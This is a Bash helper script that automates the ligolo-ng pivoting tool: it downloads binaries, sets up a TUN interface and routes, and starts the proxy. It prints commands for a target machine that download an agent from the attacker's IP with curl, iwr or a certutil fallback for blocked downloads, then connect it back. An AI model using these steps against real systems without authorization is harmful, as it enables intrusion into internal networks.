#!/bin/bash
# Ligolo-ng Helper Script
# Simplifies setup and management of ligolo-ng tunneling

set -e

# Configuration
LIGOLO_VERSION="v0.8.2"
LIGOLO_DIR="${LIGOLO_DIR:-$HOME/.ligolo-ng}"
TUN_NAME="${TUN_NAME:-ligolo}"
PROXY_PORT="${PROXY_PORT:-11601}"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_banner() {
    echo -e "${BLUE}"
    echo "╔══════════════════════════════════════════╗"
    echo "║         Ligolo-ng Helper Script          ║"
    echo "║              Version 1.0                 ║"
    echo "╚══════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_usage() {
    echo "Usage: $0 <command> [options]"
    echo ""
    echo "Commands:"
    echo "  auto                  Full auto-setup: download, tun, and start proxy"
    echo "  download              Download latest ligolo-ng binaries"
    echo "  setup-tun             Create and configure TUN interface"
    echo "  teardown-tun          Remove TUN interface"
    echo "  proxy [options]       Start the proxy server"
    echo "  add-route <cidr>      Add route to TUN interface"
    echo "  del-route <cidr>      Remove route from TUN interface"
    echo "  agent-cmd <ip>        Show agent command for target"
    echo "  status                Show current ligolo status"
    echo "  help                  Show this help message"
    echo ""
    echo "Environment Variables:"
    echo "  LIGOLO_DIR            Directory for binaries (default: ~/.ligolo-ng)"
    echo "  TUN_NAME              TUN interface name (default: ligolo)"
    echo "  PROXY_PORT            Proxy listen port (default: 11601)"
    echo ""
    echo "Examples:"
    echo "  $0 auto                     # One command to rule them all"
    echo "  $0 add-route 10.10.10.0/24  # Add route after agent connects"
    echo "  $0 agent-cmd 192.168.1.100  # Show agent commands"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}Error: This command requires root privileges${NC}"
        echo "Run with: sudo $0 $*"
        exit 1
    fi
}

check_dependencies() {
    local missing=()
    for cmd in curl jq tar ip; do
        if ! command -v "$cmd" &> /dev/null; then
            missing+=("$cmd")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${RED}Error: Missing dependencies: ${missing[*]}${NC}"
        echo "Install with: sudo apt install curl jq tar iproute2"
        exit 1
    fi
}

get_latest_version() {
    local version
    version=$(curl -s "https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest" | jq -r '.tag_name')
    if [[ -n "$version" && "$version" != "null" ]]; then
        echo "$version"
    else
        echo "$LIGOLO_VERSION"
    fi
}

download_binaries() {
    check_dependencies

    echo -e "${BLUE}[*] Fetching latest version...${NC}"
    local version
    version=$(get_latest_version)
    echo -e "${GREEN}[+] Latest version: $version${NC}"

    mkdir -p "$LIGOLO_DIR"
    cd "$LIGOLO_DIR"

    local base_url="https://github.com/nicocha30/ligolo-ng/releases/download/${version}"

    # Define binaries to download
    declare -A binaries=(
        ["proxy_linux_amd64"]="ligolo-ng_proxy_${version#v}_linux_amd64.tar.gz"
        ["agent_linux_amd64"]="ligolo-ng_agent_${version#v}_linux_amd64.tar.gz"
        ["agent_windows_amd64"]="ligolo-ng_agent_${version#v}_windows_amd64.zip"
        ["agent_linux_arm64"]="ligolo-ng_agent_${version#v}_linux_arm64.tar.gz"
        ["agent_darwin_arm64"]="ligolo-ng_agent_${version#v}_darwin_arm64.tar.gz"
    )

    for name in "${!binaries[@]}"; do
        local filename="${binaries[$name]}"
        local url="${base_url}/${filename}"

        echo -e "${BLUE}[*] Downloading ${name}...${NC}"
        if curl -sL -o "$filename" "$url"; then
            # Extract based on file type
            if [[ "$filename" == *.tar.gz ]]; then
                tar -xzf "$filename"
            elif [[ "$filename" == *.zip ]]; then
                unzip -o -q "$filename" 2>/dev/null || true
            fi
            rm -f "$filename"
            echo -e "${GREEN}[+] Downloaded ${name}${NC}"
        else
            echo -e "${YELLOW}[!] Failed to download ${name}${NC}"
        fi
    done

    # Rename for easier access
    [[ -f "proxy" ]] && mv proxy ligolo-proxy 2>/dev/null || true
    [[ -f "agent" ]] && mv agent ligolo-agent 2>/dev/null || true
    [[ -f "agent.exe" ]] && mv agent.exe ligolo-agent.exe 2>/dev/null || true

    chmod +x ligolo-* 2>/dev/null || true

    echo ""
    echo -e "${GREEN}[+] Binaries downloaded to: $LIGOLO_DIR${NC}"
    ls -la "$LIGOLO_DIR"
}

setup_tun() {
    check_root

    echo -e "${BLUE}[*] Creating TUN interface: $TUN_NAME${NC}"

    # Check if interface already exists
    if ip link show "$TUN_NAME" &> /dev/null; then
        echo -e "${YELLOW}[!] Interface $TUN_NAME already exists${NC}"
        ip link show "$TUN_NAME"
        return 0
    fi

    # Create TUN interface
    ip tuntap add user "$(logname 2>/dev/null || echo $SUDO_USER)" mode tun "$TUN_NAME"
    ip link set "$TUN_NAME" up

    echo -e "${GREEN}[+] TUN interface $TUN_NAME created and activated${NC}"
    ip addr show "$TUN_NAME"
}

teardown_tun() {
    check_root

    echo -e "${BLUE}[*] Removing TUN interface: $TUN_NAME${NC}"

    if ! ip link show "$TUN_NAME" &> /dev/null; then
        echo -e "${YELLOW}[!] Interface $TUN_NAME does not exist${NC}"
        return 0
    fi

    ip link set "$TUN_NAME" down
    ip tuntap del mode tun "$TUN_NAME"

    echo -e "${GREEN}[+] TUN interface $TUN_NAME removed${NC}"
}

start_proxy() {
    local proxy_path="$LIGOLO_DIR/ligolo-proxy"

    if [[ ! -f "$proxy_path" ]]; then
        echo -e "${RED}Error: Proxy binary not found at $proxy_path${NC}"
        echo "Run '$0 download' first"
        exit 1
    fi

    # Check if TUN interface exists
    if ! ip link show "$TUN_NAME" &> /dev/null; then
        echo -e "${YELLOW}[!] TUN interface $TUN_NAME not found${NC}"
        echo "Run 'sudo $0 setup-tun' first"
        exit 1
    fi

    echo -e "${BLUE}[*] Starting Ligolo-ng proxy on port $PROXY_PORT${NC}"
    echo -e "${YELLOW}[!] Once an agent connects:${NC}"
    echo "    1. Type 'session' to select the agent"
    echo "    2. Type 'ifconfig' to see agent's network interfaces"
    echo "    3. Add routes: sudo $0 add-route <target_cidr>"
    echo "    4. Type 'tunnel_start --tun $TUN_NAME' to start tunneling"
    echo ""

    # Pass any additional arguments to proxy
    "$proxy_path" -laddr "0.0.0.0:$PROXY_PORT" "$@"
}

add_route() {
    check_root

    local cidr="$1"
    if [[ -z "$cidr" ]]; then
        echo -e "${RED}Error: Please specify a CIDR (e.g., 10.10.10.0/24)${NC}"
        exit 1
    fi

    # Validate CIDR format
    if ! echo "$cidr" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$'; then
        echo -e "${RED}Error: Invalid CIDR format. Use: X.X.X.X/XX${NC}"
        exit 1
    fi

    echo -e "${BLUE}[*] Adding route $cidr via $TUN_NAME${NC}"
    ip route add "$cidr" dev "$TUN_NAME"
    echo -e "${GREEN}[+] Route added${NC}"
    ip route | grep "$TUN_NAME"
}

del_route() {
    check_root

    local cidr="$1"
    if [[ -z "$cidr" ]]; then
        echo -e "${RED}Error: Please specify a CIDR (e.g., 10.10.10.0/24)${NC}"
        exit 1
    fi

    echo -e "${BLUE}[*] Removing route $cidr${NC}"
    ip route del "$cidr" dev "$TUN_NAME" 2>/dev/null || echo -e "${YELLOW}[!] Route not found${NC}"
    echo -e "${GREEN}[+] Route removed${NC}"
}

show_agent_cmd() {
    local attacker_ip="$1"

    if [[ -z "$attacker_ip" ]]; then
        attacker_ip=$(get_attacker_ip)
    fi

    echo ""
    echo -e "${GREEN}=== Agent Commands ===${NC}"
    echo ""
    echo -e "${BLUE}Linux (with cert validation - recommended):${NC}"
    echo "  ./ligolo-agent -connect ${attacker_ip}:${PROXY_PORT} -accept-fingerprint <FINGERPRINT>"
    echo ""
    echo -e "${BLUE}Linux (ignore cert - lab only):${NC}"
    echo "  ./ligolo-agent -connect ${attacker_ip}:${PROXY_PORT} -ignore-cert"
    echo ""
    echo -e "${BLUE}Windows (ignore cert - lab only):${NC}"
    echo "  .\\ligolo-agent.exe -connect ${attacker_ip}:${PROXY_PORT} -ignore-cert"
    echo ""
    echo -e "${BLUE}Through SOCKS proxy:${NC}"
    echo "  ./ligolo-agent -connect ${attacker_ip}:${PROXY_PORT} -ignore-cert --socks 127.0.0.1:1080"
    echo ""
    echo -e "${YELLOW}Transfer agent to target:${NC}"
    echo "  # Start HTTP server"
    echo "  python3 -m http.server 8000 -d $LIGOLO_DIR"
    echo ""
    echo "  # On target (Linux)"
    echo "  curl http://${attacker_ip}:8000/ligolo-agent -o /tmp/agent && chmod +x /tmp/agent"
    echo ""
    echo "  # On target (Windows PowerShell)"
    echo "  iwr http://${attacker_ip}:8000/ligolo-agent.exe -OutFile agent.exe"
    echo ""
}

show_status() {
    echo -e "${GREEN}=== Ligolo-ng Status ===${NC}"
    echo ""

    # Check binaries
    echo -e "${BLUE}Binaries:${NC}"
    if [[ -d "$LIGOLO_DIR" ]]; then
        ls -la "$LIGOLO_DIR" 2>/dev/null | grep ligolo || echo "  No binaries found"
    else
        echo "  Directory $LIGOLO_DIR not found"
    fi
    echo ""

    # Check TUN interface
    echo -e "${BLUE}TUN Interface ($TUN_NAME):${NC}"
    if ip link show "$TUN_NAME" &> /dev/null; then
        ip addr show "$TUN_NAME" | head -4
    else
        echo "  Not configured"
    fi
    echo ""

    # Check routes
    echo -e "${BLUE}Routes via $TUN_NAME:${NC}"
    ip route | grep "$TUN_NAME" || echo "  No routes configured"
    echo ""

    # Check if proxy is running
    echo -e "${BLUE}Proxy Process:${NC}"
    pgrep -a ligolo-proxy || echo "  Not running"
}

get_attacker_ip() {
    # Priority: tun0 > tun1 > tap0 > default route
    local ip=""

    for iface in tun0 tun1 tap0; do
        ip=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP 'inet \K[0-9.]+')
        if [[ -n "$ip" ]]; then
            echo "$ip"
            return
        fi
    done

    # Fallback to default route
    ip=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}')
    if [[ -n "$ip" ]]; then
        echo "$ip"
        return
    fi

    echo "<YOUR_IP>"
}

auto_setup() {
    local attacker_ip
    attacker_ip=$(get_attacker_ip)

    local script_path
    script_path=$(realpath "$0" 2>/dev/null || echo "$0")

    echo -e "${GREEN}=== Ligolo-ng Auto Setup ===${NC}"
    echo ""
    echo -e "${BLUE}What is this?${NC}"
    echo "  Ligolo-ng creates a VPN-like tunnel to a target network."
    echo "  Once set up, you can access the target network directly"
    echo "  (nmap, ssh, curl, etc.) without proxychains."
    echo ""

    # Step 1: Download if needed
    if [[ ! -f "$LIGOLO_DIR/ligolo-proxy" ]]; then
        echo -e "${BLUE}[1/3] Downloading binaries...${NC}"
        download_binaries
    else
        echo -e "${GREEN}[1/3] Binaries already present${NC}"
    fi
    echo ""

    # Step 2: Setup TUN if needed
    echo -e "${BLUE}[2/3] Setting up TUN interface...${NC}"
    if ! ip link show "$TUN_NAME" &> /dev/null; then
        ip tuntap add user root mode tun "$TUN_NAME"
        ip link set "$TUN_NAME" up
        echo -e "${GREEN}[+] TUN interface $TUN_NAME created${NC}"
    else
        echo -e "${GREEN}[+] TUN interface $TUN_NAME already exists${NC}"
    fi
    echo ""

    # Step 3: Start file server in background
    echo -e "${BLUE}[3/3] Starting file server for agent transfer...${NC}"
    if command -v python3 &> /dev/null; then
        # Kill any existing file server on 8000
        pkill -f "python3 -m http.server 8000" 2>/dev/null || true
        sleep 0.5
        (cd "$LIGOLO_DIR" && python3 -m http.server 8000 &>/dev/null &)
        echo -e "${GREEN}[+] File server running on port 8000${NC}"
    else
        echo -e "${YELLOW}[!] python3 not found - you'll need to transfer agent manually${NC}"
    fi
    echo ""

    # Clear instructions
    echo -e "${YELLOW}╔═══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║                        FOLLOW THESE STEPS                             ║${NC}"
    echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}STEP 1: Download agent on target machine${NC}"
    echo ""
    echo "  TARGET IS LINUX:"
    echo -e "    ${GREEN}curl http://${attacker_ip}:8000/ligolo-agent -o /tmp/a && chmod +x /tmp/a${NC}"
    echo ""
    echo "  TARGET IS WINDOWS (PowerShell):"
    echo -e "    ${GREEN}iwr http://${attacker_ip}:8000/ligolo-agent.exe -o a.exe${NC}"
    echo ""
    echo -e "  ${YELLOW}(If blocked, try: certutil -urlcache -split -f http://${attacker_ip}:8000/ligolo-agent.exe a.exe)${NC}"
    echo ""
    echo -e "${BLUE}STEP 2: Run agent on target${NC}"
    echo ""
    echo "  LINUX:"
    echo -e "    ${GREEN}/tmp/a -connect ${attacker_ip}:${PROXY_PORT} -ignore-cert${NC}"
    echo ""
    echo "  WINDOWS:"
    echo -e "    ${GREEN}.\\a.exe -connect ${attacker_ip}:${PROXY_PORT} -ignore-cert${NC}"
    echo ""
    echo -e "${BLUE}STEP 3: Wait for agent to connect${NC}"
    echo ""
    echo "  You will see this message in the proxy console below:"
    echo -e "    ${GREEN}INFO[0042] Agent joined: YOURPC\\username @ YOURPC${NC}"
    echo ""
    echo -e "${BLUE}STEP 4: Select the agent and find target network${NC}"
    echo ""
    echo "  Type these commands in the proxy console:"
    echo -e "    ${GREEN}session${NC}     Press Enter, then press Enter again to select agent"
    echo -e "    ${GREEN}ifconfig${NC}    Look for internal IP like 10.x.x.x or 192.168.x.x"
    echo ""
    echo "  Example output:"
    echo -e "    ${YELLOW}┌──────────────────────────────────────────────${NC}"
    echo -e "    ${YELLOW}│ Interface 3: Ethernet0${NC}"
    echo -e "    ${YELLOW}│ ├── 10.10.10.5/24        <-- THIS IS THE TARGET NETWORK${NC}"
    echo -e "    ${YELLOW}└──────────────────────────────────────────────${NC}"
    echo ""
    echo -e "${BLUE}STEP 5: Add route (OPEN NEW TERMINAL)${NC}"
    echo ""
    echo "  Use the subnet from Step 4 (change last number to 0):"
    echo -e "    ${GREEN}${script_path} add-route 10.10.10.0/24${NC}"
    echo ""
    echo -e "${BLUE}STEP 6: Start tunnel (back in proxy console)${NC}"
    echo ""
    echo -e "    ${GREEN}tunnel_start --tun ${TUN_NAME}${NC}"
    echo ""
    echo "  You should see:"
    echo -e "    ${GREEN}INFO[0123] Tunnel started on interface ${TUN_NAME}${NC}"
    echo ""
    echo -e "${YELLOW}╔═══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║                           YOU'RE DONE!                                ║${NC}"
    echo -e "${YELLOW}║                                                                       ║${NC}"
    echo -e "${YELLOW}║  Now you can access the target network directly:                      ║${NC}"
    echo -e "${YELLOW}║    nmap -sV 10.10.10.0/24           # Scan the network                ║${NC}"
    echo -e "${YELLOW}║    ssh user@10.10.10.20             # SSH to internal host            ║${NC}"
    echo -e "${YELLOW}║    curl http://10.10.10.50          # Access internal web server      ║${NC}"
    echo -e "${YELLOW}║                                                                       ║${NC}"
    echo -e "${YELLOW}║  No proxychains needed!                                               ║${NC}"
    echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${RED}TROUBLESHOOTING:${NC}"
    echo "  Agent won't connect? Make sure port ${PROXY_PORT} is open:"
    echo -e "    ${GREEN}iptables -I INPUT -p tcp --dport ${PROXY_PORT} -j ACCEPT${NC}"
    echo ""
    echo -e "${GREEN}[*] Starting proxy on 0.0.0.0:$PROXY_PORT ... (Ctrl+C to stop)${NC}"
    echo ""

    # Cleanup on exit
    cleanup() {
        echo ""
        echo -e "${BLUE}[*] Cleaning up...${NC}"
        pkill -f "python3 -m http.server 8000" 2>/dev/null || true
        echo -e "${GREEN}[+] File server stopped${NC}"
    }
    trap cleanup EXIT

    "$LIGOLO_DIR/ligolo-proxy" -laddr "0.0.0.0:$PROXY_PORT" -selfcert
}

# Main
print_banner

case "${1:-help}" in
    auto)
        auto_setup
        ;;
    download)
        download_binaries
        ;;
    setup-tun)
        setup_tun
        ;;
    teardown-tun)
        teardown_tun
        ;;
    proxy)
        shift
        start_proxy "$@"
        ;;
    add-route)
        add_route "$2"
        ;;
    del-route)
        del_route "$2"
        ;;
    agent-cmd)
        show_agent_cmd "$2"
        ;;
    status)
        show_status
        ;;
    help|--help|-h)
        print_usage
        ;;
    *)
        echo -e "${RED}Unknown command: $1${NC}"
        echo ""
        print_usage
        exit 1
        ;;
esac
